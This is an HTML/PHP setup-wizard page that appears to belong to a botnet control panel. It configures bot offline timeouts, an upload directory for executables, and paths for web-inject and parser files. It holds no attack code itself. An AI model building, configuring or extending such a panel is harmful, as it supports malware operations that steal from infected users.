 <div id="login">
            <div class="login-wrapper" data-active="log">
                <div id="log">
                    <div class="page-header">
                        <h3 class="center">Setup || Step 2 [Set variables]</h3>
                     <?php if(isset($msg2)) echo '<div>'.$msg2.'</div>'; ?>
                    </div>
                    <form class="form-horizontal" action="?step=3" method="post">
                  	
                  	<input type="hidden" name="step" value="3" />
                          <div class="row-fluid">
                            <div class="control-group">
                                <div class="controls-row">
                                 Limit items on page
                                    <input class="span12" type="text" name="limit_entries"  value="20" value="">
                                </div>
                            </div><!-- End .control-group  -->
                            
							  <div class="control-group">
                                <div class="controls-row">
                                 Login fail attempts
                                    <input class="span12" type="text" name="login_block_position"  value="3" value="">
                                </div>
                            </div><!-- End .control-group  -->
                            
							
                            <div class="control-group">
                                <div class="controls-row">
                                Bots offline status (seconds)
                                    <input class="span12" type="text" name="offline_time" value="300" value="">
                                </div>
                            </div><!-- End .control-group  -->  
							
							
							     	     
                            <div class="control-group">
                                <div class="controls-row">
                                Base url (with http://)
                                    <input class="span12" type="text" name="base_url" placeholder="Base Url" value="">
                                </div>
                            </div><!-- End .control-group  -->  
							
							
                            <div class="control-group">
                                <div class="controls-row">
                                Site/Pages title (allowed: only a-z A-Z 0-9 _-)
                                    <input class="span12" type="text" name="title_of_the_pages" placeholder="Site title" value="">
                                </div>
                            </div><!-- End .control-group  -->  
							
							
							     
                            <div class="control-group">
                                <div class="controls-row">
                                Upload exe directory (allowed: a-z A-Z 0-9 _-)
                                    <input class="span12" type="text" name="uploadDir" value="upload/" value="upload/">
                                </div>
                            </div><!-- End .control-group  -->  
							
							
							     
                            <div class="control-group">
                                <div class="controls-row">
                                InjectsFile directory (allowed: a-z A-Z 0-9 _- /)
                                    <input class="span12" type="text" name="InjectsFile" value="upload/injects.txt.php" value="">
                                </div>
                            </div><!-- End .control-group  -->  
							
							
							     
                            <div class="control-group">
                                <div class="controls-row">
                                ParserFile directory (allowed: a-z A-Z 0-9 _- /)
                                    <input class="span12" type="text" name="ParserFile" value="upload/parser.txt.php" value="">
                                </div>
                            </div><!-- End .control-group  -->  
                            
                            
                        
                            <div class="form-actions full">
                               
                                <button name="continue" type="submit" class="btn btn-primary pull-right span5">Continue</button>
                            </div>
                        </div><!-- End .row-fluid  -->
                    </form>
             
   </div>
                
            <div class="clearfix"></div>
        </div>
    </div>
  </body>
</html>